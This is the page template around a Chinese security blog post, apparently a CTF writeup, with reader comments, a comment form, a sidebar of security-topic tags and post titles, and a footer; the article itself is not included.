        <li class="-mob-share-twitter"><p>Twitter</p></li>
        <li class="-mob-share-pocket"><p>Pocket</p></li>
        <li class="-mob-share-google"><p>Google+</p></li>
        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
        <li class="-mob-share-mingdao"><p>明道</p></li>
        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
    </ul>
    <div class="-mob-share-close">取消</div>
</div>
<div class="-mob-share-ui-bg"></div>
<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
<!--MOB SHARE END-->

        <div class="qqlist">
          <h3>订阅本站<small>(RSS)</small></h3>
          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
          <input type="hidden" value="qf_booked_feedback" name="t" />
          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
          <button type="submit" >订阅&rarr;</button>
          </form>
        </div>


        </div>

        
        <div class="post-single type-post text-center">
            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
            <img src="../static/wx.jpg" width="280" alt="">
        </div>
        

        <!-- 评论位置 -->
        <div id="comments" class="comments">
          <h3>已有 7 条评论</h3>
            <ol class="comment-list">
            
            
              <li class="comment-body" id="comment-1952">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/7cef7bd6af503a3e82747d464d9362f1.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">该昵称已屏蔽</a></div>
                    <p>真的很不错   为博主点赞  为同行点赞</p>
                    <span class="comment-time">时间: 2015-03-05 17:31</span>
                    <span class="comment-reply"><a href="#comment-1952" onclick="reply_to('1952','该昵称已屏蔽')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1795">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c8e1e5dfbddb46fad203b16f5dcdfa62.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://blog.ideafactory.pw" target="_blank" rel="nofollow noopener">Mr.lonely</a></div>
                    <p>知道今天我才看到了这个writeup......是不是太弱了.....<br>还有一句话------&quot;弹你一个脑瓜蹦&quot;!</p>
                    <span class="comment-time">时间: 2014-10-10 00:38</span>
                    <span class="comment-reply"><a href="#comment-1795" onclick="reply_to('1795','Mr.lonely')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1789">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">小飞</a></div>
                    <p>还是说个小问题<br>由于你暴露你出题人的身份- -<br>别人回忆所有你接触过的东西<br>举个例子<br>svg那个prompt.pl有此题<br>fd牛的open_basedir<br>所以嘛，出题可不能暴露身份/*论m锅，p牛带我飞xdctf*/</p>
                    <span class="comment-time">时间: 2014-10-07 10:55</span>
                    <span class="comment-reply"><a href="#comment-1789" onclick="reply_to('1789','小飞')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1788">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/1d72b8c00b874cd585f14c5d7ac12da5.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://fuck.0day5.com" target="_blank" rel="nofollow noopener">saline</a></div>
                    <p>你始终不敢正视我的问题，<br>学挖掘机到底哪家强？</p>
                    <span class="comment-time">时间: 2014-10-06 15:20</span>
                    <span class="comment-reply"><a href="#comment-1788" onclick="reply_to('1788','saline')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1787">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">酱油甲</a></div>
                    <p>唉，还是和大神差距比较大啊==看来自己不是搞信安的料</p>
                    <span class="comment-time">时间: 2014-10-06 09:51</span>
                    <span class="comment-reply"><a href="#comment-1787" onclick="reply_to('1787','酱油甲')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1785">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">e0fic</a></div>
                    <p>求WEB180的writeup</p>
                    <span class="comment-time">时间: 2014-10-05 21:40</span>
                    <span class="comment-reply"><a href="#comment-1785" onclick="reply_to('1785','e0fic')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-1784">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/b3c82cead78f48461085ab77b6cddb96.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://x0day.me" target="_blank" rel="nofollow noopener">DM_</a></div>
                    <p>你始终不敢正视我的问题，<br>学挖掘机到底哪家强？</p>
                    <span class="comment-time">时间: 2014-10-05 15:40</span>
                    <span class="comment-reply"><a href="#comment-1784" onclick="reply_to('1784','DM_')">回复</a></span>
                    </div>
                </div>
              </li>
            
            
            </ol>
            
        </div>

        <div id="reply"></div>
        <div id="comment-place">
            <div id="comment-post" class="respond none-resize">
             <div id="respond">
                <h3 id="response">添加新评论</h3>
                <form method="post" id="comment-form" role="form" action="#comments">
                    <p>
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
                    </p>
                    <p>
                        <label for="mail">Email</label>
                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
                    </p>
                    <p>
                        <label for="url">网站</label>
                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
                    </p>
                    <p>
                        <label for="textarea" class="required">内容</label>
                        <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
                    </p>
                    <p>
                        <label style="float:left;">验证码</label>
                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="ec9368f40282e6d8747cb043dc741974f331f94f" />
</div><div class="col-6">
<img src="../captcha/image/ec9368f40282e6d8747cb043dc741974f331f94f/index.png" alt="captcha" class="captcha" /></div></div>
                    </p>
                    <p>
                        <button type="submit" class="submit">提交评论</button>
                        <input type="hidden" name="parent" id="id_parent">
                        <input type="hidden" name="archive" value="328" id="id_archive">
                        <input type="hidden" name="csrfmiddlewaretoken" value="hUan1qilnmL96QpWPPEWLDuNB24g912B3syezvT4LIZSEodkRQBHI6xSWplrIDeT">
                    </p>
                </form>
                </div>
            </div>
        </div>

    </div>
    



<div  class="col-5 columns" id="sidebar" role="complementary">

  <div class="widget widget_search">
    <h3>搜索</h3>
    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
        <button type="submit"  id="searchsubmit">Go</button>
    </form>
  </div>

  
  <div class="widget">
	<h3 class="widget-title">最新评论</h3>
	<ul class="widget-list" id="recent-comment">
    
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
        </li>
    
    </ul>
  </div>

  <div class="widget widget-category">
	<h3>分类</h3>
	<ul id="blogsort" class="widget-list">
    
    
    <li>
        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
    </li>
    
    <li>
        <a href="../sort/C.html">C/C++<em>32</em></a>
    </li>
    
    <li>
        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
    </li>
    
    <li>
        <a href="../sort/PYTHON.html">Python<em>19</em></a>
    </li>
    
    <li>
        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
    </li>
    
    </ul>
  </div>

  <div class="widget widget-tag">
	<h3>随机标签</h3>
	<div class="tag-cloud">
        
        
        <a rel="tag" href="../tag/wopus.html">wopus</a>
        
        <a rel="tag" href="../tag/Mysql.html">Mysql</a>
        
        <a rel="tag" href="../tag/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB.html">哈希长度扩展攻击</a>
        
        <a rel="tag" href="../tag/sec-news.html">sec-news</a>
        
        <a rel="tag" href="../tag/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6.html">备份文件</a>
        
        <a rel="tag" href="../tag/xss.html">xss</a>
        
        <a rel="tag" href="../tag/ChatGPT.html">ChatGPT</a>
        
        <a rel="tag" href="../tag/WAF.html">WAF</a>
        
        <a rel="tag" href="../tag/CSP.html">CSP</a>
        
        <a rel="tag" href="../tag/php-fpm.html">php-fpm</a>
        
        <a rel="tag" href="../tag/hashcat.html">hashcat</a>
        
        <a rel="tag" href="../tag/ImageMagick.html">ImageMagick</a>
        
        <a rel="tag" href="../tag/php.ini.html">php.ini</a>
        
        <a rel="tag" href="../tag/LD_PRELOAD.html">LD_PRELOAD</a>
        
        <a rel="tag" href="../tag/java%E5%AE%89%E5%85%A8.html">java安全</a>
        
        <a rel="tag" href="../tag/%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a>
        
        <a rel="tag" href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
        
        <a rel="tag" href="../tag/XDCTF.html">XDCTF</a>
        
        <a rel="tag" href="../tag/3ds.html">3ds</a>
        
        <a rel="tag" href="../tag/%E5%BA%93%E5%87%BD%E6%95%B0.html">库函数</a>
        
        <a rel="tag" href="../tag/apache.html">apache</a>
        
        <a rel="tag" href="../tag/%E6%BA%A2%E5%87%BA.html">溢出</a>
        
        <a rel="tag" href="../tag/goahead.html">goahead</a>
        
        <a rel="tag" href="../tag/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84.html">内存映射</a>
        
        <a rel="tag" href="../tag/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html">上传漏洞</a>
        
        <a rel="tag" href="../tag/%E9%98%B2%E7%9B%97%E9%93%BE.html">防盗链</a>
        
        <a rel="tag" href="../tag/%E6%B5%8B%E8%AF%95.html">测试</a>
        
        <a rel="tag" href="../tag/%E4%BD%8D%E8%BF%90%E7%AE%97.html">位运算</a>
        
        <a rel="tag" href="../tag/gh0st.html">gh0st</a>
        
        <a rel="tag" href="../tag/phpwind.html">phpwind</a>
        
    </div>
  </div>

  <div class="widget widget-recent-entries">
	<h3 class="widget-title">热门日志</h3>
	<ul id="hotlog" class="widget-list">
    
    
        <li><a href="../other/tinger.html">About.Me</a></li>
    
        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
    
        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
    
        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
    
        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
    
    </ul>
  </div>
  

</div>
</div>

<div id="footer">
	<!-- copyright -->
	<div class="container">
		<div class="row remove-bottom">
			<div class="col-6 columns">
			<h3>Little About</h3>
			<p>Phithon 非强迫症小青年  <br>
现居先 <br>
爱好：种花、买书、收藏明信片 <br>
欢迎各大组织收留 <br>
E-mail：root@leavesongs.com </p>
			</div>

			<div class="col-10 columns">

				<h3 class="mobile-hide">Follow me</h3>
        <div id="social-links">
          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
        </div>
        <div class="bot-line"></div>
				<p class="copyright">
	Copyright &copy; Powered by talkbook
				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
                    <a href="../index.html">更换模板</a>
				</p>
			</div>
		</div>
	</div>
	<!-- /copyright -->
</div>
<a href="#" id="go-top">Top ↑</a>
<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
<script src="../static/deep/js/config.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function () {
    $(".entry a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $(".entry img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>

</body>

</html>